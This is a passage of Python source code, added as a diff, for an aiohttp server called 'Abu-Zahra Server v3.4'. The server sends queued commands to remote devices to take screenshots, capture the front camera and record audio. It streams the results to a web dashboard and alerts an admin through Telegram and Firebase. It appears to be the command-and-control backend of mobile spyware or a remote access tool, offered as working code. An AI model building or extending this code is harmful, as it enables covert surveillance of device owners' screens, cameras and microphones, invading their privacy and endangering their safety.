+  5220→                return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+  5221→
+  5222→            # Stop existing stream for this device if any
+  5223→            if device_id in _jpeg_stream_info and _jpeg_stream_info[device_id].get("active"):
+  5224→                _jpeg_stream_info[device_id]["active"] = False
+  5225→                task = _jpeg_stream_tasks_module.get(device_id)
+  5226→                if task and not task.done():
+  5227→                    task.cancel()
+  5228→
+  5229→            # Set up stream info
+  5230→            _jpeg_stream_info[device_id] = {
+  5231→                "active": True,
+  5232→                "type": stream_type,
+  5233→                "interval": interval,
+  5234→                "started_at": time.time(),
+  5235→                "last_command_time": 0,
+  5236→                "last_frame_time": 0,
+  5237→                "frame_count": 0,
+  5238→            }
+  5239→
+  5240→            # Send the first screenshot command immediately
+  5241→            cmd_map = {"screen": "screenshot", "camera": "front_camera", "audio": "record_audio"}
+  5242→            await queue_command(device_id, cmd_map.get(stream_type, "screenshot"))
+  5243→
+  5244→            # Start background loop
+  5245→            task = asyncio.create_task(_jpeg_stream_loop(device_id, stream_type, interval))
+  5246→            _jpeg_stream_tasks_module[device_id] = task
+  5247→
+  5248→            await update_device(device_id, {"streaming": True})
+  5249→            append_event("JPEG stream started", {"device_id": device_id, "type": stream_type})
+  5250→            log.info("JPEG stream started: device=%s type=%s interval=%ds", device_id, stream_type, interval)
+  5251→
+  5252→            return web.json_response({"ok": True, "message": f"JPEG streaming started ({stream_type})"})
+  5253→        except Exception as exc:
+  5254→            log.error("jpeg_stream_start error: %s", exc)
+  5255→            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+  5256→
+  5257→    @require_auth
+  5258→    async def api_jpeg_stream_stop(request):
+  5259→        """POST /api/stream/jpeg_stop - Stop JPEG screenshot streaming for a device."""
+  5260→        global api_hits
+  5261→        api_hits += 1
+  5262→        try:
+  5263→            body = await request.json()
+  5264→            device_id = body.get("device_id", "")
+  5265→
+  5266→            if not device_id:
+  5267→                return web.json_response({"ok": False, "error": "device_id required"}, status=400)
+  5268→
+  5269→            info = _jpeg_stream_info.get(device_id)
+  5270→            stream_type_saved = info.get("type", "") if info else ""
+  5271→            if info:
+  5272→                info["active"] = False
+  5273→                task = _jpeg_stream_tasks_module.get(device_id)
+  5274→                if task and not task.done():
+  5275→                    task.cancel()
+  5276→                del _jpeg_stream_tasks_module[device_id]
+  5277→                del _jpeg_stream_info[device_id]
+  5278→
+  5279→            # Also queue stop commands if it was an audio stream
+  5280→            if stream_type_saved == "audio":
+  5281→                await queue_command(device_id, "stop_audio_stream")
+  5282→
+  5283→            await update_device(device_id, {"streaming": False})
+  5284→            # Clean cached frames
+  5285→            for key in list(_latest_frames_module.keys()):
+  5286→                if device_id in key:
+  5287→                    del _latest_frames_module[key]
+  5288→
+  5289→            append_event("JPEG stream stopped", {"device_id": device_id})
+  5290→            log.info("JPEG stream stopped: device=%s", device_id)
+  5291→
+  5292→            return web.json_response({"ok": True, "message": "JPEG streaming stopped"})
+  5293→        except Exception as exc:
+  5294→            log.error("jpeg_stream_stop error: %s", exc)
+  5295→            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+  5296→
+  5297→    async def api_stream_start(request):
+  5298→        """POST /api/stream/start - Receive stream start notification from device"""
+  5299→        global api_hits
+  5300→        api_hits += 1
+  5301→        try:
+  5302→            body = await request.json()
+  5303→            device_id = body.get("device_id", "")
+  5304→            stream_id = body.get("stream_id", "")
+  5305→            stream_type = body.get("stream_type", "")
+  5306→            config = body.get("config", {})
+  5307→
+  5308→            # Validate device token
+  5309→            device_token = request.headers.get("X-Device-Token", "")
+  5310→            if not get_device_by_token(device_id, device_token):
+  5311→                return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+  5312→
+  5313→            await update_device(device_id, {"streaming": True, "stream_id": stream_id, "stream_type": stream_type})
+  5314→            append_event("Stream started", {"device_id": device_id, "stream_id": stream_id, "type": stream_type})
+  5315→            log.info("Stream started: device=%s stream=%s type=%s", device_id, stream_id, stream_type)
+  5316→
+  5317→            return web.json_response({"ok": True})
+  5318→        except Exception as exc:
+  5319→            log.error("stream_start error: %s", exc)
+  5320→            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+  5321→
+  5322→    async def api_stream_stop(request):
+  5323→        """POST /api/stream/stop - Receive stream stop notification from device"""
+  5324→        global api_hits
+  5325→        api_hits += 1
+  5326→        try:
+  5327→            body = await request.json()
+  5328→            device_id = body.get("device_id", "")
+  5329→            stream_id = body.get("stream_id", "")
+  5330→            duration = body.get("duration", 0)
+  5331→            bytes_sent = body.get("bytes_sent", 0)
+  5332→
+  5333→            # Validate device token
+  5334→            device_token = request.headers.get("X-Device-Token", "")
+  5335→            if not get_device_by_token(device_id, device_token):
+  5336→                return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)
+  5337→
+  5338→            await update_device(device_id, {"streaming": False, "stream_id": ""})
+  5339→
+  5340→            # Clean up cached frames
+  5341→            for key in list(_latest_frames.keys()):
+  5342→                if device_id in key:
+  5343→                    del _latest_frames[key]
+  5344→            for key in list(_latest_audio.keys()):
+  5345→                if device_id in key:
+  5346→                    del _latest_audio[key]
+  5347→
+  5348→            append_event("Stream stopped", {"device_id": device_id, "stream_id": stream_id, "duration": duration, "bytes": bytes_sent})
+  5349→            log.info("Stream stopped: device=%s stream=%s duration=%dms", device_id, stream_id, duration)
+  5350→
+  5351→            return web.json_response({"ok": True})
+  5352→        except Exception as exc:
+  5353→            log.error("stream_stop error: %s", exc)
+  5354→            return web.json_response({"ok": False, "error": "Internal server error"}, status=500)
+  5355→
+  5356→    app.router.add_get("/ws/stream", ws_stream)
+  5357→    app.router.add_get("/ws/stream/viewer", ws_stream_viewer)
+  5358→    app.router.add_get("/api/stream/frame/{device_id}", api_stream_frame)
+  5359→    app.router.add_get("/api/stream/status", api_stream_status)
+  5360→    app.router.add_post("/api/stream/start", api_stream_start)
+  5361→    app.router.add_post("/api/stream/stop", api_stream_stop)
+  5362→    app.router.add_post("/api/stream/jpeg_start", api_jpeg_stream_start)
+  5363→    app.router.add_post("/api/stream/jpeg_stop", api_jpeg_stream_stop)
+  5364→
+  5365→    # ========== DASHBOARD WEBSOCKET (Real-time Updates) ==========
+  5366→    _dashboard_ws_clients = set()
+  5367→
+  5368→    async def ws_dashboard(request):
+  5369→        """WebSocket endpoint for dashboard real-time updates - /ws/dashboard?token=xxx"""
+  5370→        ws = web.WebSocketResponse(heartbeat=30)
+  5371→        await ws.prepare(request)
+  5372→
+  5373→        # Authenticate via query param
+  5374→        token = request.query.get("token", "")
+  5375→        if not token or not validate_session(token):
+  5376→            await ws.close(code=4001, message="Unauthorized")
+  5377→            return ws
+  5378→
+  5379→        _dashboard_ws_clients.add(ws)
+  5380→        log.info("Dashboard WebSocket connected (total: %d)", len(_dashboard_ws_clients))
+  5381→        try:
+  5382→            # Send initial data
+  5383→            devices = get_devices()
+  5384→            cmds = load_json(COMMANDS_FILE, [])[-50:]
+  5385→            events = load_json(EVENTS_FILE, [])[-50:]
+  5386→            online = sum(1 for d in devices if d.get("active"))
+  5387→            pending = sum(1 for c in cmds if c.get("status") == "pending")
+  5388→            completed = sum(1 for c in cmds if c.get("status") == "completed")
+  5389→            initial = {
+  5390→                "type": "init",
+  5391→                "devices": devices,
+  5392→                "commands": cmds,
+  5393→                "events": events,
+  5394→                "stats": {
+  5395→                    "uptime": get_uptime(),
+  5396→                    "uptime_formatted": format_uptime(get_uptime()),
+  5397→                    "devices_total": len(devices),
+  5398→                    "devices_online": online,
+  5399→                    "commands_total": len(cmds),
+  5400→                    "commands_pending": pending,
+  5401→                    "commands_completed": completed,
+  5402→                    "messages_sent": messages_sent,
+  5403→                    "api_hits": api_hits,
+  5404→                    "events_total": len(events),
+  5405→                    "total_registered_commands": len(COMMAND_REGISTRY),
+  5406→                }
+  5407→            }
+  5408→            await ws.send_json(initial)
+  5409→
+  5410→            # Keep connection alive with periodic updates
+  5411→            async for msg in ws:
+  5412→                if msg.type == aiohttp.WSMsgType.TEXT:
+  5413→                    if msg.data == "ping":
+  5414→                        await ws.send_json({"type": "pong"})
+  5415→                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
+  5416→                    break
+  5417→        except Exception as exc:
+  5418→            log.debug("Dashboard WS error: %s", exc)
+  5419→        finally:
+  5420→            _dashboard_ws_clients.discard(ws)
+  5421→            log.info("Dashboard WebSocket disconnected (total: %d)", len(_dashboard_ws_clients))
+  5422→
+  5423→        return ws
+  5424→
+  5425→    async def broadcast_to_dashboards(message):
+  5426→        """Send a message to all connected dashboard WebSocket clients."""
+  5427→        if not _dashboard_ws_clients:
+  5428→            return
+  5429→        dead = set()
+  5430→        msg_str = json.dumps(message) if not isinstance(message, str) else message
+  5431→        for ws_conn in list(_dashboard_ws_clients):
+  5432→            try:
+  5433→                await ws_conn.send_str(msg_str)
+  5434→            except Exception:
+  5435→                dead.add(ws_conn)
+  5436→        _dashboard_ws_clients.difference_update(dead)
+  5437→
+  5438→    async def dashboard_push_loop():
+  5439→        """Background task: periodically push stats updates to connected dashboards."""
+  5440→        while True:
+  5441→            await asyncio.sleep(4)
+  5442→            if not _dashboard_ws_clients:
+  5443→                continue
+  5444→            try:
+  5445→                devices = get_devices()
+  5446→                cmds = load_json(COMMANDS_FILE, [])
+  5447→                events = load_json(EVENTS_FILE, [])
+  5448→                online = sum(1 for d in devices if d.get("active"))
+  5449→                pending = sum(1 for c in cmds if c.get("status") == "pending")
+  5450→                completed = sum(1 for c in cmds if c.get("status") == "completed")
+  5451→                stats_msg = {
+  5452→                    "type": "stats_update",
+  5453→                    "stats": {
+  5454→                        "uptime": get_uptime(),
+  5455→                        "uptime_formatted": format_uptime(get_uptime()),
+  5456→                        "devices_total": len(devices),
+  5457→                        "devices_online": online,
+  5458→                        "commands_total": len(cmds),
+  5459→                        "commands_pending": pending,
+  5460→                        "commands_completed": completed,
+  5461→                        "messages_sent": messages_sent,
+  5462→                        "api_hits": api_hits,
+  5463→                        "events_total": len(events),
+  5464→                        "total_registered_commands": len(COMMAND_REGISTRY),
+  5465→                    }
+  5466→                }
+  5467→                await broadcast_to_dashboards(stats_msg)
+  5468→            except Exception:
+  5469→                pass
+  5470→
+  5471→    app.router.add_get("/ws/dashboard", ws_dashboard)
+  5472→    # Store refs for the startup hook
+  5473→    app["_dashboard_ws_clients"] = _dashboard_ws_clients
+  5474→    app["_broadcast_to_dashboards"] = broadcast_to_dashboards
+  5475→    app["_dashboard_push_loop"] = dashboard_push_loop
+  5476→
+  5477→    # Static files
+  5478→    static_dir = Path(__file__).parent / "static"
+  5479→    if static_dir.exists():
+  5480→        app.router.add_static("/static", static_dir)
+  5481→    
+  5482→    return app
+  5483→
+  5484→
+  5485→async def on_startup(app):
+  5486→    ensure_data_dir()
+  5487→    log.info("=" * 60)
+  5488→    log.info("Abu-Zahra Server v3.4 starting...")
+  5489→    log.info("Domain: %s", SERVER_DOMAIN)
+  5490→    log.info("Port: %d", SERVER_PORT)
+  5491→    log.info("Admin: %d", ADMIN_CHAT_ID)
+  5492→    log.info("Commands: %d", len(COMMAND_REGISTRY))
+  5493→    log.info("Firebase Secret: %s", "SET" if FIREBASE_DB_SECRET else "NOT SET")
+  5494→    log.info("=" * 60)
+  5495→
+  5496→    # Check Firebase connectivity at startup
+  5497→    await check_firebase_connectivity()
+  5498→    if not firebase_connected:
+  5499→        log.warning("Firebase not reachable - running in LOCAL-ONLY mode (commands via REST API only)")
+  5500→    else:
+  5501→        log.info("Firebase connected - commands will be pushed to Firebase RTDB")
+  5502→
+  5503→    # Start Telegram polling in background
+  5504→    app["tg_task"] = asyncio.create_task(tg_poll_loop())
+  5505→    # Start session cleanup
+  5506→    app["cleanup_task"] = asyncio.create_task(session_cleanup_loop())
+  5507→    # Start Firebase result listener
+  5508→    app["fb_listener_task"] = asyncio.create_task(firebase_result_listener())
+  5509→    # Start device monitoring (online/offline alerts)
+  5510→    app["monitor_task"] = asyncio.create_task(device_monitoring_loop())
+  5511→    # Start dashboard WebSocket push loop
+  5512→    if app.get("_dashboard_push_loop"):
+  5513→        app["dashboard_push_task"] = asyncio.create_task(app["_dashboard_push_loop"]())
+  5514→    
+  5515→    # Notify admin
+  5516→    try:
+  5517→        await send_admin(
+  5518→            f"🟥 <b>Abu-Zahra Server v3.4</b> started!\n\n"
+  5519→            f"📡 Port: <code>{SERVER_PORT}</code>\n"
+  5520→            f"🌐 Domain: <code>{SERVER_DOMAIN}</code>\n"
+  5521→            f"📋 Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
+  5522→            f"📱 Web: <code>{SERVER_DOMAIN}/dashboard</code>"
+  5523→        )
+  5524→    except Exception:
+  5525→        pass
+  5526→
+  5527→
+  5528→async def on_cleanup(app):
+  5529→    global polling_active
+  5530→    polling_active = False
+  5531→    if "tg_task" in app:
+  5532→        app["tg_task"].cancel()
+  5533→    if "cleanup_task" in app:
+  5534→        app["cleanup_task"].cancel()
+  5535→    if "fb_listener_task" in app:
+  5536→        app["fb_listener_task"].cancel()
+  5537→    if "monitor_task" in app:
+  5538→        app["monitor_task"].cancel()
+  5539→    global _tg_session
+  5540→    if _tg_session and not _tg_session.closed:
+  5541→        await _tg_session.close()
+  5542→
+  5543→
+  5544→def main():
+  5545→    app = create_app()
+  5546→    app.on_startup.append(on_startup)
+  5547→    app.on_cleanup.append(on_cleanup)
+  5548→    
+  5549→    log.info("Starting server on port %d...", SERVER_PORT)
+  5550→    web.run_app(app, host="0.0.0.0", port=SERVER_PORT, print=None)
+  5551→
+  5552→
+  5553→if __name__ == "__main__":
+  5554→    main()
+  5555→
